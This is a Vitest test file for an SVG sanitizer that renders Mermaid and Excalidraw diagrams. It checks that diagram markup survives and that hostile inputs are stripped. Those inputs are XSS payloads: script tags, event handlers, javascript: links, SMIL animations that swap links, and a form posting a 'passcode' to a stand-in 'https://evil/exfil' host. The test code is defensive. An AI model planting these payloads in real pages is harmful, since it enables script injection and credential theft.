import { describe, expect, it } from 'vitest'
import { sanitizeSvg } from '../src/client/lib/sanitize-svg'

/**
 * Every sink this pass feeds draws markup the app did not write — the pasted Mermaid diagram and the
 * stencil preview below, a note's own Mermaid block through `enhance.ts` — so these cases prove it
 * keeps a diagram whole while taking away the things an SVG can do that a picture cannot: run a
 * script, carry a handler, point a link or a SMIL animation at `javascript:`, hold a form.
 *
 * The label assertions are the half a profile written for SVG alone gets wrong: Mermaid paints a
 * node's text as HTML inside `<foreignObject>`, so the `div`s and `span` that hold it, and the inline
 * style that sizes it, have to survive the pass — not only their characters.
 */
describe('sanitizeSvg', () => {
  it('keeps the HTML label Mermaid draws inside a foreignObject', () => {
    const dirty =
      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 40"><g class="node"><rect/>' +
      '<foreignObject width="100" height="30">' +
      '<div xmlns="http://www.w3.org/1999/xhtml" style="display:inline-block;white-space:nowrap">' +
      '<div class="nodeLabel">Deploy <span class="accent">now</span><br/></div>' +
      '</div></foreignObject></g></svg>'
    const clean = sanitizeSvg(dirty)
    expect(clean).toContain('<foreignObject')
    expect(clean).toContain('<div')
    expect(clean).toContain('class="nodeLabel"')
    expect(clean).toContain('<span')
    expect(clean).toContain('<br')
    expect(clean).toContain('white-space:nowrap')
    expect(clean).toContain('Deploy')
  })

  it('keeps the shape and style pieces a Mermaid diagram is drawn from', () => {
    const dirty =
      '<svg xmlns="http://www.w3.org/2000/svg"><style>.node{fill:#fff}</style>' +
      '<defs><marker id="arrow"><path d="M0 0L4 2"/></marker></defs>' +
      '<g class="node"><rect/><use xlink:href="#arrow"/>' +
      '<path d="M0 0L9 9" marker-end="url(#arrow)"/></g></svg>'
    const clean = sanitizeSvg(dirty)
    expect(clean).toContain('<style')
    expect(clean).toContain('<marker')
    expect(clean).toContain('<use')
    expect(clean).toContain('xlink:href="#arrow"')
    expect(clean).toContain('marker-end="url(#arrow)"')
  })

  it('keeps an Excalidraw filter and its blur primitive', () => {
    const svg =
      '<svg xmlns="http://www.w3.org/2000/svg"><defs>' +
      '<filter id="f"><feGaussianBlur stdDeviation="2"/></filter>' +
      '<clipPath id="c"><rect/></clipPath></defs>' +
      '<rect filter="url(#f)" clip-path="url(#c)"/></svg>'
    const clean = sanitizeSvg(svg)
    expect(clean).toContain('<filter')
    expect(clean).toContain('<feGaussianBlur')
    expect(clean).toContain('<clipPath')
  })

  it('drops a script element and every event handler, in markup and inside a label', () => {
    const dirty =
      '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script>' +
      '<rect width="10" height="10" onload="alert(1)" onclick="alert(1)" onmouseover="alert(1)"/>' +
      '<foreignObject><div><script>alert(2)</script>' +
      '<span onerror="alert(3)">text</span></div></foreignObject></svg>'
    const clean = sanitizeSvg(dirty)
    expect(clean).not.toContain('<script')
    expect(clean).not.toContain('alert(')
    expect(clean).not.toContain('onload')
    expect(clean).not.toContain('onclick')
    expect(clean).not.toContain('onmouseover')
    expect(clean).not.toContain('onerror')
    expect(clean).toContain('<rect')
    expect(clean).toContain('text')
  })

  it('drops a javascript: href but keeps an ordinary one', () => {
    const dirty =
      '<svg xmlns="http://www.w3.org/2000/svg">' +
      '<a href="javascript:alert(1)"><text>x</text></a>' +
      '<a href="https://example.com"><text>y</text></a></svg>'
    const clean = sanitizeSvg(dirty)
    expect(clean).not.toContain('javascript:')
    expect(clean).toContain('https://example.com')
  })

  it('drops a javascript: xlink:href, the link form a diagram exporter writes', () => {
    const dirty =
      '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">' +
      '<a xlink:href="javascript:alert(1)"><text>x</text></a></svg>'
    const clean = sanitizeSvg(dirty)
    expect(clean).not.toContain('javascript:')
    expect(clean).not.toContain('alert(')
  })

  /**
   * SMIL is the one payload a diagram has no use for: an `<animate>` on `href` or `xlink:href`
   * swaps a harmless link for a `javascript:` one after the pass has already run.
   */
  it('drops SMIL animation elements', () => {
    const dirty =
      '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">' +
      '<a href="#safe"><animate attributeName="href" values="javascript:alert(1)" begin="0s" dur="0.1s"/>' +
      '<set attributeName="xlink:href" to="javascript:alert(2)"/></a></svg>'
    const clean = sanitizeSvg(dirty)
    expect(clean).not.toContain('<animate')
    expect(clean).not.toContain('<set')
    expect(clean).not.toContain('attributeName')
    expect(clean).not.toContain('javascript:')
    expect(clean).toContain('href="#safe"')
  })

  it('keeps the ban on forms and form controls inside a foreignObject', () => {
    const dirty =
      '<svg xmlns="http://www.w3.org/2000/svg">' +
      '<foreignObject><div><form action="https://evil/submit"><input name="passcode"/>' +
      '<button formaction="https://evil/exfil">go</button></form></div></foreignObject></svg>'
    const clean = sanitizeSvg(dirty)
    expect(clean).not.toContain('<form')
    expect(clean).not.toContain('<input')
    expect(clean).not.toContain('formaction')
    expect(clean).not.toContain('https://evil')
    expect(clean).toContain('<div')
    expect(clean).toContain('go')
  })

  it('answers an empty string without invoking DOMPurify', () => {
    expect(sanitizeSvg('')).toBe('')
  })
})
